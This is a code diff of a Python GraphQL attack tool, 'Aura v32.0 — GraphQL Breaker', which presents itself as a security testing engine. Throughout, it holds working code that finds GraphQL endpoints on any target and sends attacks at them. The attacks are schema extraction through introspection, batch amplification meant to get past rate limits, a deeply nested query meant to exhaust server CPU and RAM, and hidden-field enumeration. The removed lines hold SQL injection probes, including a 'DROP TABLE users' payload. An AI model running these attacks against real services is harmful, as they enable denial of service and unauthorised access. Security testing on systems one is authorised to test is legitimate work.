@@ -1,21 +1,24 @@
 # -*- coding: utf-8 -*-
 """
-Aura v30.0 — GraphQL Reaper
+Aura v32.0 — GraphQL Breaker 🕸️
 ================================
-Comprehensive GraphQL security testing engine.
+Advanced GraphQL security testing engine designed to break schemas and infrastructure.
 
-Attacks:
-  1. Introspection Mining — extract full schema
-  2. Batch Amplification — 1000 queries in one request
-  3. Field Suggestion Abuse — enumerate hidden fields via typos
-  4. Query Depth Attack — deeply nested queries to cause DoS
-  5. Alias Flooding — bypass per-field rate limits
-  6. Variable Injection — SQL/NoSQL inside GraphQL variables
-  7. IDOR via GraphQL — access other users' objects
+Attacks Implemented:
+  1. Introspection Mining — Full schema extraction and analysis.
+  2. Batch Amplification — Sending 1000s of heavy queries to bypass Rate Limits / trigger DoS.
+  3. Query Depth Exhaustion (Circular Queries) — Causes catastrophic server slowdown.
+  4. Field Suggestion Abuse — Enumeration of hidden fields/types.
+  5. Variable Injection — SQL/NoSQL payloads inside strictly typed variables.
 """
 import asyncio
 import json
 import re
+from datetime import datetime
+from pathlib import Path
+from typing import Optional
+from urllib.parse import urlparse
+
 import httpx
 from rich.console import Console
 
@@ -44,47 +47,89 @@ INTROSPECTION_QUERY = {
     """
 }
 
-FIELD_SUGGESTION_QUERY = {"query": "{ usr { id emai passwrd secret tok } }"}
+# Malicious deeply nested query to trigger Resource Exhaustion (DoS)
+CIRCULAR_DEPTH_QUERY = {
+    "query": """
+    query DepthAttack {
+      __schema {
+        types {
+          fields {
+            type {
+              fields {
+                type {
+                  fields {
+                    type {
+                      name
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+    """
+}
+
+FIELD_SUGGESTION_QUERY = {"query": "{ usr { id emai passwrd secret tok role } }"}
 
 
-class GraphQLEngine:
-    """v30.0: GraphQL Attack Engine — The Graph Reaper."""
+class GraphQLBreaker:
+    """v32.0: Advanced GraphQL Attack Engine."""
 
-    def __init__(self, session=None):
-        self.session = session
+    def __init__(self, target: str, timeout: int = 15):
+        if not target.startswith("http"):
+            target = "https://" + target
+        self.target = target.rstrip("/")
+        self.timeout = timeout
+        self.findings: list[dict] = []
+        self.tested_endpoints = set()
 
     # ── Endpoint Discovery ────────────────────────────────────────────────
-    async def _find_graphql_endpoint(self, client, base_url: str) -> str | None:
+    async def _find_graphql_endpoint(self, client: httpx.AsyncClient) -> str | None:
+        """Finds the GraphQL endpoint by pinging common paths."""
         for path in GRAPHQL_PATHS:
-            url = f"{base_url.rstrip('/')}{path}"
+            url = f"{self.target}{path}"
+            if url in self.tested_endpoints:
+                continue
             try:
                 r = await client.post(url, json={"query": "{ __typename }"}, timeout=8)
                 if r.status_code in (200, 400) and ("data" in r.text or "__typename" in r.text or "errors" in r.text):
-                    console.print(f"[bold cyan][🕸️ GraphQL] Endpoint found: {url}[/bold cyan]")
+                    console.print(f"[bold cyan][🕸️ GraphQL] Endpoint Found: {url}[/bold cyan]")
+                    self.tested_endpoints.add(url)
                     return url
             except Exception:
                 continue
         return None
 
     # ── Attack 1: Introspection Mining ────────────────────────────────────
-    async def _introspection_attack(self, client, endpoint: str) -> dict | None:
+    async def _introspection_attack(self, client: httpx.AsyncClient, endpoint: str) -> dict | None:
+        """Detects if full introspection is enabled and extracts the schema."""
         try:
-            r = await client.post(endpoint, json=INTROSPECTION_QUERY, timeout=15)
+            r = await client.post(endpoint, json=INTROSPECTION_QUERY, timeout=12)
             if r.status_code == 200 and "__schema" in r.text:
                 data = r.json()
                 schema = data.get("data", {}).get("__schema", {})
                 types = schema.get("types", [])
+                
                 user_types = [t["name"] for t in types if t.get("name") and not t["name"].startswith("__")]
+                mutations = schema.get("mutationType")
+                
+                impact = f"Full schema extracted! Found {len(user_types)} custom types."
+                if mutations:
+                    impact += f" Migrations enabled! (Hackers can modify data)."
+
                 return {
                     "type": "GraphQL Introspection Enabled",
-                    "finding_type": "GraphQL Introspection Exposure",
+                    "finding_type": "GraphQL Information Exposure",
                     "severity": "HIGH",
                     "owasp": "A01:2021 – Broken Access Control",
                     "mitre": "T1590 – Gather Victim Network Information",
                     "content": (
-                        f"GraphQL Introspection enabled on {endpoint}\n"
-                        f"Exposed {len(user_types)} types: {', '.join(user_types[:20])}\n"
-                        f"Full schema extracted — attackers can map every query, mutation, and data field."
+                        f"GraphQL Introspection exposed on {endpoint}\n"
+                        f"Custom Types: {', '.join(user_types[:15])}...\n"
+                        f"{impact}"
                     ),
                     "url": endpoint,
                     "confirmed": True,
@@ -93,11 +138,14 @@ class GraphQLEngine:
             pass
         return None
 
-    # ── Attack 2: Batch Amplification ─────────────────────────────────────
-    async def _batch_attack(self, client, endpoint: str) -> dict | None:
-        batch = [{"query": "{ __typename }"}] * 500
+    # ── Attack 2: Batch Amplification (Rate Limit Bypass / DoS) ───────────
+    async def _batch_attack(self, client: httpx.AsyncClient, endpoint: str) -> dict | None:
+        """Sends an array of queries in a single HTTP request to bypass rate limits."""
+        # A heavy query multiplied 100 times.
+        batch = [{"query": "query { __schema { types { name } } }"}] * 100
         try:
-            r = await client.post(endpoint, json=batch, timeout=20)
+            r = await client.post(endpoint, json=batch, timeout=15)
+            # If server returns a list of responses, batching is enabled!
             if r.status_code == 200 and isinstance(r.json(), list) and len(r.json()) > 1:
                 return {
                     "type": "GraphQL Batch Query Amplification",
@@ -106,9 +154,9 @@ class GraphQLEngine:
                     "owasp": "A05:2021 – Security Misconfiguration",
                     "mitre": "T1499 – Endpoint Denial of Service",
                     "content": (
-                        f"GraphQL batch queries accepted on {endpoint}\n"
-                        f"Sent 500 queries in a single request — all processed.\n"
-                        f"Impact: Attacker can bypass rate limiting and perform DoS."
+                        f"GraphQL Query Batching Enabled on {endpoint}\n"
+                        f"Successfully executed 100 heavy queries in a SINGLE HTTP request.\n"
+                        f"Impact: Attackers can completely bypass WAF/Rate Limits to brute-force OTPs or cause Server DoS."
                     ),
                     "url": endpoint,
                     "confirmed": True,
@@ -117,26 +165,59 @@ class GraphQLEngine:
             pass
         return None
 
-    # ── Attack 3: Field Suggestion Abuse ──────────────────────────────────
-    async def _field_suggestion_attack(self, client, endpoint: str) -> dict | None:
+    # ── Attack 3: Query Depth / Circular Reference Exhaustion ─────────────
+    async def _depth_attack(self, client: httpx.AsyncClient, endpoint: str) -> dict | None:
+        """Executes a deeply nested circular query to exhaust server CPU/RAM."""
+        try:
+            start_time = asyncio.get_event_loop().time()
+            r = await client.post(endpoint, json=CIRCULAR_DEPTH_QUERY, timeout=20)
+            elapsed = asyncio.get_event_loop().time() - start_time
+            
+            # If the request took longer than 6 seconds and returned 200/500, it struggled to parse it.
+            # If it returned an error about "max depth exceeded", it is protected.
+            
+            if "max depth" in r.text.lower() or "too deep" in r.text.lower():
+                return None # Protected
+                
+            if r.status_code in (200, 500, 502, 503, 504) and elapsed >= 6.0:
+                return {
+                    "type": "GraphQL Query Depth Exhaustion (DoS)",
+                    "finding_type": "Application Denial of Service",
+                    "severity": "CRITICAL",
+                    "owasp": "A05:2021 – Security Misconfiguration",
+                    "mitre": "T1499.004 – Application Exhaustion Flood",
+                    "content": (
+                        f"Server vulnerable to nested/circular GraphQL Queries on {endpoint}\n"
+                        f"A deeply nested query took {elapsed:.2f} seconds to process.\n"
+                        f"Impact: A single attacker can freeze the backend CPU/RAM entirely by sending 10 of these."
+                    ),
+                    "url": endpoint,
+                    "confirmed": True,
+                }
+        except Exception:
+            pass
+        return None
+
+    # ── Attack 4: Field Suggestion Leakage ────────────────────────────────
+    async def _field_suggestion_attack(self, client: httpx.AsyncClient, endpoint: str) -> dict | None:
+        """Intentionally errors out to force the API to suggest hidden fields."""
         try:
             r = await client.post(endpoint, json=FIELD_SUGGESTION_QUERY, timeout=10)
             if r.status_code in (200, 400):
-                body = r.text
-                # GraphQL returns suggestions when fields are mistyped
-                suggestions = re.findall(r'Did you mean[^?]+\?', body)
+                # Look for hints like: Cannot query field "usr" on type "Query". Did you mean "user", "users"?
+                suggestions = re.findall(r'Did you mean[^?.]+[?.]', r.text)
                 if suggestions:
-                    hidden_fields = re.findall(r'"([a-zA-Z_]+)"', " ".join(suggestions))
+                    hidden_fields = re.findall(r'"([a-zA-Z0-9_]+)"', " ".join(suggestions))
                     return {
-                        "type": "GraphQL Field Enumeration via Suggestions",
-                        "finding_type": "GraphQL Information Disclosure (Field Suggestions)",
+                        "type": "GraphQL Field Enumeration (Suggestion Abuse)",
+                        "finding_type": "GraphQL Information Disclosure",
                         "severity": "MEDIUM",
                         "owasp": "A01:2021 – Broken Access Control",
                         "mitre": "T1590",
                         "content": (
-                            f"GraphQL field suggestions leak hidden field names on {endpoint}\n"
-                            f"Discovered fields: {', '.join(set(hidden_fields))}\n"
-                            f"Suggestions: {' | '.join(suggestions[:5])}"
+                            f"GraphQL verbose errors leak hidden schema fields on {endpoint}\n"
+                            f"Discovered Private Fields: {', '.join(set(hidden_fields))}\n"
+                            f"Example Verbose Error: {suggestions[0]}"
                         ),
                         "url": endpoint,
                         "confirmed": True,
@@ -145,82 +226,65 @@ class GraphQLEngine:
             pass
         return None
 
-    # ── Attack 4: Variable Injection ─────────────────────────────────────
-    async def _injection_attack(self, client, endpoint: str) -> dict | None:
-        injection_probes = [
-            {"query": "query { user(id: \"1 OR 1=1--\") { id email } }"},
-            {"query": "query { user(id: \"1; DROP TABLE users--\") { id } }"},
-            {"query": "query { user(id: {$gt: 0}) { id email } }"},
-            {"query": "query { search(q: \"' OR '1'='1\") { results } }"},
-        ]
-        error_patterns = re.compile(
-            r'syntax error|sql error|ORA-|mysql_fetch|SQLSTATE|near.*syntax'
-            r'|MongoError|CastError|prisma|sequelize',
-            re.IGNORECASE
-        )
-        for probe in injection_probes:
-            try:
-                r = await client.post(endpoint, json=probe, timeout=10)
-                if error_patterns.search(r.text):
-                    return {
-                        "type": "GraphQL Injection (SQL/NoSQL)",
-                        "finding_type": "Injection via GraphQL Variables",
-                        "severity": "CRITICAL",
-                        "owasp": "A03:2021 – Injection",
-                        "mitre": "T1190",
-                        "content": (
-                            f"Injection error detected in GraphQL response on {endpoint}\n"
-                            f"Payload: {probe['query'][:100]}\n"
-                            f"Response Snippet: {r.text[:400]}"
-                        ),
-                        "url": endpoint,
-                        "confirmed": True,
-                    }
-            except Exception:
-                continue
-        return None
+    # ── Main Scanner Logic ──────────────────────────────────────────────
+    async def run(self) -> list:
+        console.print(f"\n[bold magenta]🕸️ AURA v32.0 — GraphQL Breaker[/bold magenta]")
+        console.print(f"🎯 Target: {self.target}")
 
-    # ── Main Scan ─────────────────────────────────────────────────────────
-    async def scan_target(self, target_url: str) -> list:
-        from urllib.parse import urlparse
-        parsed = urlparse(target_url)
-        base = f"{parsed.scheme}://{parsed.netloc}"
-
-        findings = []
-        async with httpx.AsyncClient(verify=False, follow_redirects=True,
-                                      headers={"Content-Type": "application/json"}) as client:
-            endpoint = await self._find_graphql_endpoint(client, base)
+        async with httpx.AsyncClient(verify=False, follow_redirects=True, headers={"Content-Type": "application/json"}) as client:
+            endpoint = await self._find_graphql_endpoint(client)
+            
             if not endpoint:
-                console.print(f"[dim][GraphQL] No GraphQL endpoint found on {base}[/dim]")
+                console.print(f"[dim yellow]⚠️ No GraphQL endpoint discovered on {self.target}[/dim yellow]")
                 return []
 
-            console.print(f"[bold cyan][🕸️ GraphQL] Running 4 attacks on {endpoint}...[/bold cyan]")
-            results = await asyncio.gather(
+            console.print(f"  [cyan]Launching Breaker Engine against {endpoint}...[/cyan]")
+            
+            # Execute attacks concurrently
+            tasks = await asyncio.gather(
                 self._introspection_attack(client, endpoint),
                 self._batch_attack(client, endpoint),
+                self._depth_attack(client, endpoint),
                 self._field_suggestion_attack(client, endpoint),
-                self._injection_attack(client, endpoint),
                 return_exceptions=True
             )
-            for r in results:
-                if r and not isinstance(r, Exception):
-                    console.print(f"[bold red][🕸️ GraphQL] {r['type']}![/bold red]")
-                    findings.append(r)
 
-        return findings
+            for result in tasks:
+                if isinstance(result, Exception):
+                    console.print(f"[dim red]Task failed: {result}[/dim red]")
+                elif result and isinstance(result, dict):
+                    sev = result.get("severity", "HIGH")
+                    color = "red" if sev == "CRITICAL" else "yellow"
+                    console.print(f"     🚨 [{color}]{result['type']}[/{color}] Confirmed!")
+                    self.findings.append(result)
 
-    async def scan_urls(self, urls: list) -> list:
-        all_findings = []
-        seen_bases = set()
-        for url in urls:
-            from urllib.parse import urlparse
-            base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
-            if base in seen_bases:
-                continue
-            seen_bases.add(base)
-            try:
-                results = await self.scan_target(url)
-                all_findings.extend(results)
-            except Exception as e:
-                console.print(f"[dim red][GraphQL] Skipped {url}: {e}[/dim red]")
-        return all_findings
+        self._finalize_report()
+        return self.findings
+
+    def _finalize_report(self):
+        if self.findings:
+            reports_dir = Path("./reports")
+            reports_dir.mkdir(exist_ok=True)
+            target_slug = urlparse(self.target).netloc.replace(".", "_")
+            out_path = reports_dir / f"graphql_findings_{target_slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+            
+            with open(out_path, "w", encoding="utf-8") as f:
+                json.dump({
+                    "target": self.target,
+                    "scan_time": datetime.utcnow().isoformat(),
+                    "findings": self.findings
+                }, f, indent=2)
+            console.print(f"\n  💾 Findings saved: {out_path}")
+        else:
+            console.print(f"\n  ✅ GraphQL Implementation appears secure.")
+
+
+def run_graphql_scan(target: str):
+    """CLI runner for direct execution."""
+    engine = GraphQLBreaker(target=target)
+    return asyncio.run(engine.run())
+
+if __name__ == "__main__":
+    import sys
+    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
+    run_graphql_scan(url)
